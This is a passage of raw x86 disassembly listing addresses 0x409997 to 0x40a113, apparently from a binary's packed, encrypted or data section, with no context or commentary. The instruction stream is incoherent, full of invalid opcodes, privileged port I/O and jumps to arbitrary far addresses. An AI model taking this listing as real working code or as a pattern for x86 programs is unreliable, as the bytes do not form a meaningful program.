  409997:	cmp    ebp,DWORD PTR fs:[edi-0x737157a]
  40999e:	adc    BYTE PTR [eax+0x47494d81],0xf2
  4099a5:	inc    eax
  4099a6:	js     0x40996d
  4099a8:	xchg   esi,eax
  4099a9:	dec    BYTE PTR [esp+ebx*4]
  4099ac:	stc    
  4099ad:	pop    ebp
  4099ae:	arpl   WORD PTR [ecx+0x79],dx
  4099b1:	xchg   edi,eax
  4099b2:	mov    al,ds:0xd53cc9b4
  4099b7:	outs   dx,BYTE PTR ds:[esi]
  4099b8:	repz ret 0x827f
  4099bc:	pusha  
  4099bd:	dec    eax
  4099be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099bf:	loop   0x409a34
  4099c1:	in     eax,0x97
  4099c3:	cli    
  4099c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099c5:	and    edx,DWORD PTR [edx+0x7e036baa]
  4099cb:	ds (bad) 
  4099cd:	or     eax,DWORD PTR [esp+ebp*2+0x88416e]
  4099d4:	scas   al,BYTE PTR es:[edi]
  4099d5:	mov    edi,DWORD PTR [edi+0x27]
  4099d8:	popa   
  4099d9:	ret    
  4099da:	pop    ebx
  4099db:	inc    edx
  4099dc:	das    
  4099dd:	std    
  4099de:	mov    cs,WORD PTR [esi-0x76]
  4099e1:	cmp    DWORD PTR [edx-0x12dcdf88],eax
  4099e7:	fdiv   st(5),st
  4099e9:	inc    esi
  4099ea:	loopne 0x4099f4
  4099ec:	lds    eax,FWORD PTR [ebx]
  4099ee:	mov    al,0xdd
  4099f0:	sahf   
  4099f1:	call   0xb30383fd
  4099f6:	xor    BYTE PTR [edx-0x15d4b600],dl
  4099fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099fd:	push   edi
  4099fe:	cmp    edx,0x4477c60d
  409a04:	mov    dl,0x9f
  409a06:	leave  
  409a07:	stos   DWORD PTR es:[edi],eax
  409a08:	sbb    bh,BYTE PTR [ebx+0x64247891]
  409a0e:	add    edi,DWORD PTR [esi]
  409a10:	dec    edx
  409a11:	push   cs
  409a12:	stos   BYTE PTR es:[edi],al
  409a13:	mov    ds:0xb1dd9479,al
  409a18:	mov    ?,ebx
  409a1a:	out    0x85,eax
  409a1c:	jns    0x409a94
  409a1e:	jl     0x409a92
  409a20:	xor    al,0x84
  409a22:	call   0x3784:0xa77b890c
  409a29:	icebp  
  409a2a:	cmp    eax,0x8d8e2e5
  409a2f:	push   es
  409a30:	push   ebx
  409a31:	popa   
  409a32:	repz fmul st(7),st
  409a35:	jp     0x4099d5
  409a37:	lahf   
  409a38:	loope  0x409aab
  409a3a:	push   edi
  409a3b:	(bad)  
  409a3c:	jle    0x4099df
  409a3e:	mov    edi,0x7f28f668
  409a43:	ror    BYTE PTR [edx-0x778031ee],0x36
  409a4a:	fwait
  409a4b:	aam    0x50
  409a4d:	neg    dh
  409a4f:	shl    BYTE PTR [edi],0xe1
  409a52:	cmp    DWORD PTR [ecx+0x76],ebp
  409a55:	lods   eax,DWORD PTR ds:[esi]
  409a56:	add    BYTE PTR [edx+0x3d49724c],bh
  409a5c:	mov    eax,cs
  409a5e:	push   ecx
  409a5f:	out    0xd0,eax
  409a61:	jno    0x409a3e
  409a63:	push   ds
  409a64:	mov    ch,ch
  409a66:	call   0x413b:0x72079a11
  409a6d:	add    DWORD PTR [eax],ecx
  409a6f:	adc    eax,0x8fab0cf2
  409a74:	jecxz  0x409a69
  409a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a77:	in     al,dx
  409a78:	xor    BYTE PTR ds:0x89850c15,ah
  409a7e:	sub    DWORD PTR [eax],esp
  409a80:	fs dec esi
  409a82:	xchg   edx,eax
  409a83:	sub    eax,0x50b819cf
  409a88:	or     eax,0xb0fa19d8
  409a8d:	jo     0x409a3a
  409a8f:	popf   
  409a90:	cli    
  409a91:	add    BYTE PTR [edx+0x35],al
  409a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a95:	jmp    0x409ab0
  409a97:	aad    0x20
  409a99:	dec    esp
  409a9a:	iret   
  409a9b:	inc    ebx
  409a9c:	(bad)  
  409a9d:	mov    al,0xcb
  409a9f:	xor    bl,ah
  409aa1:	inc    edi
  409aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa3:	ins    DWORD PTR es:[edi],dx
  409aa4:	cmp    ebx,DWORD PTR [eax]
  409aa6:	sbb    ebx,esi
  409aa8:	push   edi
  409aa9:	mov    ss,edx
  409aab:	and    eax,0x64eb9670
  409ab0:	jae    0x409a90
  409ab2:	out    0xa,al
  409ab4:	out    0x7c,eax
  409ab6:	jb     0x409b09
  409ab8:	stc    
  409ab9:	daa    
  409aba:	daa    
  409abb:	xchg   ebx,eax
  409abc:	jb     0x409ab4
  409abe:	push   cs
  409abf:	jno    0x409a82
  409ac1:	and    eax,0x81adacbc
  409ac6:	ss mov esi,0x1826de1c
  409acc:	or     edx,DWORD PTR [edx-0x6548f38f]
  409ad2:	dec    ecx
  409ad3:	lahf   
  409ad4:	adc    al,BYTE PTR [eax]
  409ad6:	out    dx,eax
  409ad7:	mov    ecx,0x566e232c
  409adc:	clc    
  409add:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ade:	retf   0x2b93
  409ae1:	and    edi,ecx
  409ae3:	ins    DWORD PTR es:[edi],dx
  409ae4:	push   0xffffffdd
  409ae6:	mov    al,ds:0x9e9445e3
  409aeb:	ins    BYTE PTR es:[edi],dx
  409aec:	rcl    DWORD PTR [esi-0x58222cad],1
  409af2:	mov    eax,0xa509f07a
  409af7:	xor    esp,ebx
  409af9:	fadd   DWORD PTR [edx*4+0xeda61a9]
  409b00:	mov    BYTE PTR [ecx-0x202eb747],0x9c
  409b07:	enter  0xff9b,0xd2
  409b0b:	idiv   BYTE PTR [esp+edi*4+0x68c49621]
  409b12:	rol    BYTE PTR [ecx+0x1f31feb2],0x39
  409b19:	retf   
  409b1a:	push   ebp
  409b1b:	push   0x52f784be
  409b20:	fiadd  DWORD PTR [edi-0x50da7697]
  409b26:	cli    
  409b27:	(bad)  
  409b28:	popf   
  409b29:	jmp    0x5513b325
  409b2e:	mov    ds:0x715f3f2,eax
  409b33:	js     0x409b62
  409b35:	ins    BYTE PTR es:[edi],dx
  409b36:	inc    esp
  409b37:	in     al,dx
  409b38:	enter  0xeab2,0x7f
  409b3c:	jns    0x409b35
  409b3e:	adc    DWORD PTR [edi-0x2df238c9],edx
  409b44:	and    al,bl
  409b46:	jge    0x409b0d
  409b48:	outs   dx,BYTE PTR ds:[esi]
  409b49:	mov    ds:0xd33925e6,al
  409b4e:	add    al,BYTE PTR cs:[esi]
  409b51:	mov    ah,0x4e
  409b53:	sub    eax,0x16eae2ff
  409b58:	fcomp  DWORD PTR [edx-0x41]
  409b5b:	sub    edx,DWORD PTR [eax+0x15]
  409b5e:	aad    0x3f
  409b60:	pop    eax
  409b61:	mov    edx,0xfbfa0d91
  409b66:	es out dx,eax
  409b68:	shl    edi,0x70
  409b6b:	pop    es
  409b6c:	pop    eax
  409b6d:	es add ecx,edx
  409b70:	out    dx,eax
  409b71:	imul   ebx,DWORD PTR ss:[edx-0x3d],0xffffffbe
  409b76:	out    0x59,eax
  409b78:	aam    0x7c
  409b7a:	(bad)  
  409b7b:	aam    0x16
  409b7d:	xchg   esi,eax
  409b7e:	cmp    esi,ecx
  409b80:	or     ah,BYTE PTR [ecx-0x308f8581]
  409b86:	or     al,ah
  409b88:	(bad)  
  409b89:	sub    al,0x34
  409b8b:	call   0x141d058c
  409b90:	or     eax,0xba309a4a
  409b95:	jnp    0x409bf1
  409b97:	or     al,0x9c
  409b99:	inc    ebx
  409b9a:	sub    ebp,DWORD PTR [edx-0x18]
  409b9d:	out    0x58,eax
  409b9f:	es xor bl,ch
  409ba2:	adc    DWORD PTR [esp+ecx*2+0x7b4cfad6],ebx
  409ba9:	fnsetpm(287 only) 
  409bab:	xchg   esi,eax
  409bac:	lds    edi,FWORD PTR [esi-0x2d]
  409baf:	mov    ch,0xb4
  409bb1:	sbb    dl,BYTE PTR [edx]
  409bb3:	adc    ah,BYTE PTR [esi+eax*2+0x7b4aae61]
  409bba:	sbb    DWORD PTR [ebp-0x70],eax
  409bbd:	jo     0x409b5d
  409bbf:	inc    esi
  409bc0:	fldenv [ebx+edi*2]
  409bc3:	inc    esi
  409bc4:	dec    ecx
  409bc5:	or     ebx,DWORD PTR [ebx+0x4]
  409bc8:	mov    ch,0x32
  409bca:	or     eax,0xd25c9d78
  409bcf:	test   DWORD PTR [ecx],edx
  409bd1:	or     al,0x9e
  409bd3:	sub    esp,esi
  409bd5:	loop   0x409c18
  409bd7:	add    edx,DWORD PTR [eax+0x8]
  409bda:	pop    ebx
  409bdb:	mov    al,dh
  409bdd:	ret    
  409bde:	mov    esi,0x6c4655e
  409be3:	out    0xe6,eax
  409be5:	jmp    0x409bd6
  409be7:	and    DWORD PTR [edi-0x6a48064a],0x4
  409bee:	test   al,0x4b
  409bf0:	and    al,0x3f
  409bf2:	dec    esp
  409bf3:	jnp    0x409c4f
  409bf5:	jno    0x409bab
  409bf7:	jp     0x409b91
  409bf9:	dec    esp
  409bfa:	lods   eax,DWORD PTR ds:[esi]
  409bfb:	mov    BYTE PTR [ebx+ebp*1],bl
  409bfe:	sbb    eax,0x516b0761
  409c03:	sub    dl,BYTE PTR [esi+esi*1+0x1f]
  409c07:	or     eax,0xbc0018a9
  409c0c:	lds    esi,FWORD PTR [ecx-0x6f]
  409c0f:	lea    edx,[ecx+edx*2]
  409c12:	pop    esp
  409c13:	sbb    bh,BYTE PTR [ebx-0x41bdeb42]
  409c19:	pop    ebp
  409c1a:	mov    edx,0x44db4791
  409c1f:	xchg   ecx,eax
  409c20:	iret   
  409c21:	and    esp,ebx
  409c23:	push   0xc0590ce8
  409c28:	cmp    DWORD PTR [ecx+ecx*1],edx
  409c2b:	or     al,0x77
  409c2d:	mov    dl,0x93
  409c2f:	mov    dh,0x3e
  409c31:	and    BYTE PTR [ebp-0x30],bl
  409c34:	pop    ds
  409c35:	pop    edx
  409c36:	sahf   
  409c37:	enter  0xcce9,0xda
  409c3b:	mov    dl,0xb6
  409c3d:	mov    eax,0xaf577623
  409c42:	sbb    BYTE PTR [eax-0x3ebd7b89],ah
  409c48:	dec    ebp
  409c49:	ds mov edi,0xe6d390ee
  409c4f:	xchg   esp,eax
  409c50:	lahf   
  409c51:	cmp    al,0x61
  409c53:	mov    edi,DWORD PTR [edi+0x520a0c55]
  409c59:	pop    eax
  409c5a:	or     BYTE PTR [edi+edx*8],bh
  409c5d:	adc    al,0xea
  409c5f:	dec    esp
  409c60:	jl     0x409c0c
  409c62:	dec    ebp
  409c63:	fst    QWORD PTR [edx+edx*4+0x67da0b03]
  409c6a:	ins    BYTE PTR es:[edi],dx
  409c6b:	rcr    DWORD PTR [esi+0x4043ac75],cl
  409c71:	sub    eax,0x74235c3
  409c76:	adc    bl,0x97
  409c79:	mov    eax,ss:0xf191b114
  409c7f:	mov    ebp,0x7aaa7db2
  409c84:	gs pop ds
  409c86:	out    dx,eax
  409c87:	(bad)  
  409c88:	mov    bh,BYTE PTR [esi]
  409c8a:	push   0xffffffea
  409c8c:	pop    eax
  409c8d:	loope  0x409d00
  409c8f:	mov    ah,0x96
  409c91:	daa    
  409c92:	jecxz  0x409c74
  409c94:	xchg   eax,ecx
  409c96:	pop    eax
  409c97:	arpl   WORD PTR [ebx+0x74],si
  409c9a:	mov    ecx,0xd5fbe2c3
  409c9f:	out    0x93,al
  409ca1:	out    dx,al
  409ca2:	scas   al,BYTE PTR es:[edi]
  409ca3:	adc    ebx,DWORD PTR [eax+0xd28496f]
  409ca9:	add    DWORD PTR gs:[esi+0x5b],0xffffffbb
  409cae:	fucom  st(0)
  409cb0:	cmp    eax,eax
  409cb2:	add    ebx,ebx
  409cb4:	popa   
  409cb5:	gs jecxz 0x409cab
  409cb8:	in     eax,0x3c
  409cba:	pop    edx
  409cbb:	sbb    DWORD PTR [esi+0x18],0x70
  409cbf:	bound  edi,QWORD PTR [esi-0x2d1cfcb3]
  409cc5:	add    BYTE PTR [ecx],cl
  409cc7:	push   0x7e4b4fa5
  409ccc:	mov    al,0xde
  409cce:	fs int3 
  409cd0:	ret    
  409cd1:	mov    ds:0x6f496281,al
  409cd6:	push   eax
  409cd7:	outs   dx,BYTE PTR ds:[esi]
  409cd8:	fdiv   QWORD PTR [ecx+0x583c7569]
  409cde:	mov    ds:0x995fcece,al
  409ce3:	fnstenv [edx+0x19ead5c7]
  409ce9:	out    dx,al
  409cea:	cmp    cl,0xc2
  409ced:	jle    0x409cf5
  409cef:	jg     0x409c9e
  409cf1:	enter  0x344d,0xc9
  409cf5:	pop    esp
  409cf6:	and    BYTE PTR [ebp+0x4dcb58c0],0x4d
  409cfd:	mov    ch,0x43
  409cff:	jg     0x409d74
  409d01:	sbb    al,0xed
  409d03:	mov    eax,0x8f11830f
  409d08:	iret   
  409d09:	loop   0x409d87
  409d0b:	sbb    BYTE PTR ds:0x701095eb,0xda
  409d12:	icebp  
  409d13:	cdq    
  409d14:	lock lea ebp,[ebx+edx*4-0x46]
  409d19:	test   eax,0xf3c1f04c
  409d1e:	mov    BYTE PTR [esi+0x4d],0x27
  409d22:	int3   
  409d23:	fisttp WORD PTR [edx]
  409d25:	jnp    0x409d6a
  409d27:	xor    ecx,DWORD PTR ss:[ecx]
  409d2a:	imul   eax,DWORD PTR [bx+si-0x344f],0x3f
  409d30:	loop   0x409cb5
  409d32:	jo     0x409d65
  409d34:	loopne 0x409d0f
  409d36:	push   edx
  409d37:	pop    ebp
  409d38:	and    DWORD PTR [ebp+0x2462271],eax
  409d3e:	js     0x409d7a
  409d40:	rcl    DWORD PTR [esi],cl
  409d42:	xchg   edi,eax
  409d43:	shr    BYTE PTR [esi-0x3a],cl
  409d46:	ror    BYTE PTR [eax-0xd],cl
  409d49:	xchg   esp,eax
  409d4a:	icebp  
  409d4b:	xor    ecx,ecx
  409d4d:	test   DWORD PTR [esi],ecx
  409d4f:	ja     0x409d1f
  409d51:	cli    
  409d52:	mov    WORD PTR [eax+0x381fe87a],?
  409d58:	xchg   esp,eax
  409d59:	data16 cli 
  409d5b:	sub    dl,BYTE PTR [ecx+eax*2-0x3c040af3]
  409d62:	popf   
  409d63:	ins    BYTE PTR es:[edi],dx
  409d64:	cmp    al,0x51
  409d66:	sar    eax,0xbb
  409d69:	dec    ebp
  409d6a:	popf   
  409d6b:	(bad)  
  409d6c:	and    dh,ch
  409d6e:	adc    eax,0x3605eae9
  409d73:	push   ecx
  409d74:	test   DWORD PTR [eax+ecx*1+0x17],ebx
  409d78:	adc    al,0x5e
  409d7a:	xchg   edi,eax
  409d7b:	stos   DWORD PTR es:[edi],eax
  409d7c:	sbb    dh,al
  409d7e:	mov    ch,0xe
  409d80:	jno    0x409d56
  409d82:	into   
  409d83:	and    dh,BYTE PTR [esi+0x31]
  409d86:	sbb    edi,DWORD PTR [ecx+0x15]
  409d89:	aam    0xa7
  409d8b:	out    0x5,eax
  409d8d:	out    dx,al
  409d8e:	xchg   esi,eax
  409d8f:	fmul   QWORD PTR [ebx]
  409d91:	xchg   edi,eax
  409d92:	ins    BYTE PTR es:[edi],dx
  409d93:	test   al,0x26
  409d95:	pop    edx
  409d96:	and    ebx,esp
  409d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d99:	add    DWORD PTR [edi],eax
  409d9b:	mov    ebx,0x1746a045
  409da0:	popf   
  409da1:	shl    BYTE PTR [ebp+0xc],1
  409da4:	xor    al,0x75
  409da6:	fcom   QWORD PTR [eax-0x77]
  409da9:	adc    al,0x44
  409dab:	pop    ds
  409dac:	clc    
  409dad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dae:	out    dx,eax
  409daf:	(bad)  
  409db0:	ror    esp,0x75
  409db3:	mov    bl,0x4f
  409db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db6:	fwait
  409db7:	jns    0x409dbb
  409db9:	lds    ebp,FWORD PTR [edx-0x6e1f78e7]
  409dbf:	fs inc edx
  409dc1:	(bad)  
  409dc2:	push   esi
  409dc3:	push   edx
  409dc4:	ret    0xc4c0
  409dc7:	jge    0x409e15
  409dc9:	push   0xe
  409dcb:	xor    DWORD PTR [edi+0x1d92ed6],ecx
  409dd1:	test   al,cl
  409dd3:	hlt    
  409dd4:	mov    dh,0x58
  409dd6:	adc    BYTE PTR [eax+esi*8-0x4def31f2],dl
  409ddd:	add    BYTE PTR [eax+0x3c],dl
  409de0:	or     edi,DWORD PTR [edx-0x4f]
  409de3:	loop   0x409d9f
  409de5:	pop    edx
  409de6:	sub    esp,DWORD PTR [edi-0x4c]
  409de9:	stos   BYTE PTR es:[edi],al
  409dea:	inc    edx
  409deb:	(bad)  
  409dec:	icebp  
  409ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dee:	shl    BYTE PTR [edx+eiz*1+0x39],cl
  409df2:	jecxz  0x409e13
  409df4:	jae    0x409d96
  409df6:	gs pop eax
  409df8:	push   edi
  409df9:	ins    BYTE PTR es:[edi],dx
  409dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dfb:	fidivr WORD PTR [edx-0x8]
  409dfe:	in     eax,0x40
  409e00:	nop
  409e01:	and    BYTE PTR [ebx],dh
  409e03:	rol    bl,cl
  409e05:	inc    eax
  409e06:	mov    ds:0xa963d1da,al
  409e0b:	shl    ebp,cl
  409e0d:	adc    BYTE PTR [edi+eax*8],dl
  409e10:	inc    ebp
  409e11:	jbe    0x409e12
  409e13:	rcr    BYTE PTR [eax],1
  409e15:	mov    ch,0x45
  409e17:	outs   dx,DWORD PTR ds:[esi]
  409e18:	sbb    DWORD PTR [ebx],0xffffffac
  409e1b:	sbb    bh,BYTE PTR [eax]
  409e1d:	(bad)  
  409e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e1f:	mov    cl,0x47
  409e21:	ds (bad) 
  409e23:	fidivr WORD PTR [edi+ebp*1+0x7e6da0e8]
  409e2a:	out    dx,al
  409e2b:	xor    al,BYTE PTR [ecx+0x5f]
  409e2e:	out    dx,al
  409e2f:	iret   
  409e30:	adc    eax,0xc16bf764
  409e35:	dec    ebx
  409e36:	mov    ebp,0xa9acbd84
  409e3b:	jmp    0xbb672a59
  409e40:	mov    DWORD PTR [ecx+0x20],ebx
  409e43:	cmp    al,0xca
  409e45:	repz fcom DWORD PTR [edi-0x63]
  409e49:	xchg   BYTE PTR [esi-0x61],ch
  409e4c:	(bad)  
  409e4d:	mov    ds:0x368fb2bc,al
  409e52:	mov    esp,0x4913481b
  409e57:	enter  0x95d4,0x54
  409e5b:	sbb    esp,DWORD PTR [esi]
  409e5d:	xchg   ebx,eax
  409e5e:	or     DWORD PTR [ecx+0x3cd314ee],edi
  409e64:	mov    BYTE PTR [esi],bl
  409e66:	pushf  
  409e67:	jnp    0x409e6a
  409e69:	ja     0x409e27
  409e6b:	sub    al,0x45
  409e6d:	mov    esi,0x5f394f75
  409e72:	retf   
  409e73:	sbb    ch,BYTE PTR [edx]
  409e75:	repnz fwait
  409e77:	push   ebx
  409e78:	ins    BYTE PTR es:[edi],dx
  409e79:	dec    ebp
  409e7a:	hlt    
  409e7b:	out    0x6f,al
  409e7d:	aad    0x38
  409e7f:	mov    bl,0x86
  409e81:	dec    esp
  409e82:	test   eax,0x21622c6d
  409e87:	cdq    
  409e88:	pop    esp
  409e89:	in     al,dx
  409e8a:	gs leave 
  409e8c:	mov    ds:0xa4304d7f,al
  409e91:	lds    ebx,FWORD PTR [esi]
  409e93:	xchg   esi,eax
  409e94:	retf   0x9f29
  409e97:	icebp  
  409e98:	xor    al,0x2f
  409e9a:	mov    al,0xfe
  409e9c:	test   edx,0x5372853b
  409ea2:	sub    al,0xdc
  409ea4:	dec    ebx
  409ea5:	add    DWORD PTR [eax],edi
  409ea7:	mov    al,0x9f
  409ea9:	inc    edi
  409eaa:	inc    ecx
  409eab:	loopne 0x409e7d
  409ead:	fidiv  DWORD PTR [eax+0xd]
  409eb0:	out    dx,al
  409eb1:	pop    ss
  409eb2:	data16 aad 0xa5
  409eb5:	cmp    DWORD PTR [ebx+ecx*1],edx
  409eb8:	and    ebp,ebx
  409eba:	les    ebx,FWORD PTR [eax-0x136b7529]
  409ec0:	inc    ebp
  409ec1:	fisttp WORD PTR ds:0xb93d518
  409ec7:	das    
  409ec8:	lds    edi,FWORD PTR [eax]
  409eca:	jno    0x409e9b
  409ecc:	jle    0x409e79
  409ece:	jmp    0x1ad5f1b8
  409ed3:	repnz add DWORD PTR [edi+edx*2+0x58612ee9],ebp
  409edb:	xchg   ebp,eax
  409edc:	int3   
  409edd:	ja     0x409f15
  409edf:	nop
  409ee0:	ds push eax
  409ee2:	push   edi
  409ee3:	jle    0x409f3d
  409ee5:	mov    ah,0x32
  409ee7:	std    
  409ee8:	addr16 inc edi
  409eea:	sub    eax,0x2fa00a9b
  409eef:	mov    cl,BYTE PTR [ecx+0x13]
  409ef2:	dec    esp
  409ef3:	dec    ebx
  409ef4:	in     al,dx
  409ef5:	inc    esp
  409ef7:	dec    ecx
  409ef8:	mov    ah,0x79
  409efa:	pop    ebx
  409efb:	and    al,0xd0
  409efd:	mov    edx,0xec06c443
  409f02:	es mov cl,0x2e
  409f05:	xlat   BYTE PTR ds:[ebx]
  409f06:	jmp    0x49eab789
  409f0b:	jg     0x409f11
  409f0d:	adc    BYTE PTR [eax],bl
  409f0f:	aam    0x41
  409f11:	shr    al,cl
  409f13:	mov    eax,0x8b28deb6
  409f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f19:	and    al,0x47
  409f1b:	sbb    DWORD PTR [ebx],ebx
  409f1d:	test   eax,0xae325cab
  409f22:	jbe    0x409f5e
  409f24:	dec    eax
  409f25:	xchg   BYTE PTR [edi-0x11],dl
  409f28:	inc    eax
  409f29:	xor    dl,al
  409f2b:	mov    edi,0x7869e878
  409f30:	scas   al,BYTE PTR es:[edi]
  409f31:	(bad)  
  409f32:	fs ins BYTE PTR es:[edi],dx
  409f34:	dec    eax
  409f35:	sahf   
  409f36:	pop    ecx
  409f37:	xchg   ecx,eax
  409f38:	inc    ecx
  409f39:	mov    DWORD PTR [ecx-0x3f],ebp
  409f3c:	add    al,0x53
  409f3e:	in     al,0x84
  409f40:	popa   
  409f41:	cmp    bl,BYTE PTR [edx]
  409f43:	mov    ebp,0xcb9da90e
  409f48:	test   al,0xf0
  409f4a:	aam    0xff
  409f4c:	push   ebx
  409f4d:	imul   esp,DWORD PTR [eax+0x39f15570],0x68a0a492
  409f57:	shl    DWORD PTR [ecx-0xfd8236],cl
  409f5d:	lds    ebx,FWORD PTR [ebx+ebx*1]
  409f60:	out    dx,al
  409f61:	push   ds
  409f62:	sub    dl,BYTE PTR [edi-0x225f289a]
  409f68:	adc    DWORD PTR [ecx+0x2f],eax
  409f6b:	cmp    DWORD PTR [ecx-0x4f],edi
  409f6e:	xor    DWORD PTR [eax+0x12],esp
  409f71:	and    DWORD PTR [esi],0xd4c725d7
  409f77:	aas    
  409f78:	jle    0x409f93
  409f7a:	jno    0x409f93
  409f7c:	adc    BYTE PTR [ebx+0x66437f29],bh
  409f82:	ds cmp ecx,ecx
  409f85:	test   eax,0xcc10bdf5
  409f8a:	scas   al,BYTE PTR es:[edi]
  409f8b:	pop    es
  409f8c:	push   ecx
  409f8d:	out    0x82,eax
  409f8f:	mov    ah,0x22
  409f91:	ins    BYTE PTR es:[edi],dx
  409f92:	fimul  WORD PTR [edi+0x349e123]
  409f98:	inc    esp
  409f99:	fs mov ecx,0x6cf2194f
  409f9f:	scas   al,BYTE PTR es:[edi]
  409fa0:	(bad)  
  409fa1:	inc    DWORD PTR [esi+0x220e6231]
  409fa7:	shl    BYTE PTR [esp+ecx*8-0x2e],cl
  409fab:	cmp    ebp,DWORD PTR [eax+0x1d]
  409fae:	aaa    
  409faf:	paddw  mm5,QWORD PTR [edi]
  409fb2:	jmp    0x40a020
  409fb4:	sub    BYTE PTR [ebp+0x39],dh
  409fb7:	pop    ecx
  409fb8:	out    0x4c,eax
  409fba:	jle    0x409f99
  409fbc:	mov    al,ds:0xd2ae2cb7
  409fc1:	dec    ebp
  409fc2:	sbb    BYTE PTR [ebx*8-0x5bf61cd0],ah
  409fc9:	test   BYTE PTR [esi-0x60],ch
  409fcc:	xchg   esi,eax
  409fcd:	pop    ecx
  409fce:	cmp    BYTE PTR [edi],bh
  409fd0:	dec    eax
  409fd1:	retf   
  409fd2:	gs retf 
  409fd4:	jae    0x409fd2
  409fd6:	push   edx
  409fd7:	xchg   BYTE PTR [eax],bh
  409fd9:	jbe    0x40a015
  409fdb:	pop    ss
  409fdc:	inc    eax
  409fdd:	pcmpgtw mm7,QWORD PTR [edi-0x566e2fdd]
  409fe4:	cmp    ebx,esi
  409fe6:	mov    esp,esi
  409fe8:	je     0x40a05e
  409fea:	ficomp WORD PTR [edx-0x75]
  409fed:	test   BYTE PTR [edx+0x328b05b0],dl
  409ff3:	mov    eax,0xfdbb1d0
  409ff8:	jnp    0x409f96
  409ffa:	mov    ebp,DWORD PTR [esi]
  409ffc:	cmp    DWORD PTR [ecx+0x5baa9813],edx
  40a002:	dec    eax
  40a003:	cdq    
  40a004:	repnz test BYTE PTR [eax+0x2],ch
  40a008:	dec    ebp
  40a009:	mov    edx,0xdf639eef
  40a00e:	inc    ch
  40a010:	dec    ebx
  40a011:	div    DWORD PTR [eax+ebp*2]
  40a014:	and    esp,DWORD PTR [edx+0x4e]
  40a017:	push   cs
  40a018:	mov    al,ds:0xa4a7dc52
  40a01d:	sbb    al,BYTE PTR [edx]
  40a01f:	adc    dh,BYTE PTR [edi-0x610f7a2e]
  40a025:	push   0x2ee1120e
  40a02a:	xor    al,0x1
  40a02c:	and    esp,DWORD PTR [eax]
  40a02e:	inc    edi
  40a02f:	mov    ds:0xd6ac7c5b,eax
  40a034:	jnp    0x40a075
  40a036:	out    dx,eax
  40a037:	adc    BYTE PTR [ebx-0x31489f56],dh
  40a03d:	mov    ah,0x20
  40a03f:	jle    0x409fde
  40a041:	loopne 0x40a044
  40a043:	pop    ecx
  40a044:	mov    al,BYTE PTR [ebp-0x242d8252]
  40a04a:	leave  
  40a04b:	and    esi,ecx
  40a04d:	mov    dh,BYTE PTR [ebx-0x127f76a5]
  40a053:	cmp    DWORD PTR [eax+0x54],edi
  40a056:	dec    ecx
  40a057:	inc    ebp
  40a058:	cdq    
  40a059:	shl    bh,0xe4
  40a05c:	rol    DWORD PTR [ecx+ebx*4],1
  40a05f:	adc    ebp,DWORD PTR [edi-0x336726c]
  40a065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a066:	repnz adc ecx,DWORD PTR [eax+0x28]
  40a06a:	es dec ebp
  40a06c:	(bad)  
  40a06d:	mov    edi,0xe7ec7c5d
  40a072:	lahf   
  40a073:	dec    edi
  40a074:	int    0xdb
  40a076:	and    DWORD PTR [ebx],ecx
  40a078:	cmp    DWORD PTR [ebx+eax*2],ebx
  40a07b:	sub    ah,BYTE PTR [eax+edi*1]
  40a07e:	stos   DWORD PTR es:[edi],eax
  40a07f:	test   DWORD PTR [ebp+0x2b],esi
  40a082:	call   0xf13dd8ea
  40a087:	inc    edx
  40a088:	sti    
  40a089:	inc    edi
  40a08a:	cmp    esp,DWORD PTR [ecx+0x5ae9e9e3]
  40a090:	push   esi
  40a091:	in     eax,dx
  40a092:	lea    esp,[esi]
  40a094:	popf   
  40a095:	std    
  40a096:	xchg   ebp,eax
  40a097:	aas    
  40a098:	fwait
  40a099:	push   ss
  40a09a:	iret   
  40a09b:	dec    ecx
  40a09c:	add    dh,BYTE PTR [esi-0x1439432]
  40a0a2:	pop    esi
  40a0a3:	test   al,ch
  40a0a5:	shl    esi,1
  40a0a7:	mov    esp,0x11fab65f
  40a0ac:	dec    ebp
  40a0ad:	ins    DWORD PTR es:[edi],dx
  40a0ae:	adc    cl,BYTE PTR [edx+eiz*1-0x64e3322]
  40a0b5:	xchg   ecx,eax
  40a0b6:	add    dh,BYTE PTR [eax-0x6779d638]
  40a0bc:	fisttp QWORD PTR [esi+0x3a]
  40a0bf:	lods   al,BYTE PTR ds:[esi]
  40a0c0:	and    BYTE PTR [edx],ch
  40a0c2:	push   ebp
  40a0c3:	add    eax,DWORD PTR [edi-0x5b146f89]
  40a0c9:	bound  eax,QWORD PTR [eax+0x7f]
  40a0cc:	adc    BYTE PTR [ebp-0x3a],bl
  40a0cf:	push   0xdbca4d97
  40a0d4:	dec    ebp
  40a0d5:	cmp    bh,BYTE PTR [edx-0x33]
  40a0d8:	fsubr  QWORD PTR [ebx+0x8]
  40a0db:	cmp    eax,0xe24f4c21
  40a0e0:	rcr    ah,0x4d
  40a0e3:	xor    bh,BYTE PTR [esi+0x3b8ed3a0]
  40a0e9:	cli    
  40a0ea:	jmp    0x243f:0xa2ada250
  40a0f1:	add    DWORD PTR [edx-0x7ab96fd8],edx
  40a0f7:	enter  0x44f5,0x34
  40a0fb:	inc    ebp
  40a0fc:	int    0x40
  40a0fe:	stc    
  40a0ff:	enter  0xb9e5,0xf
  40a103:	(bad)  
  40a104:	push   ds
  40a105:	dec    ecx
  40a106:	xchg   ecx,eax
  40a107:	in     eax,dx
  40a108:	outs   dx,BYTE PTR ds:[esi]
  40a109:	mov    dh,0xe4
  40a10b:	push   ecx
  40a10c:	not    DWORD PTR [edx]
  40a10e:	pop    ecx
  40a10f:	lock and BYTE PTR [eax],bl
  40a112:	xchg   ebx,eax
  40a113:	xor    al,BYTE PTR [edx+0x7f]
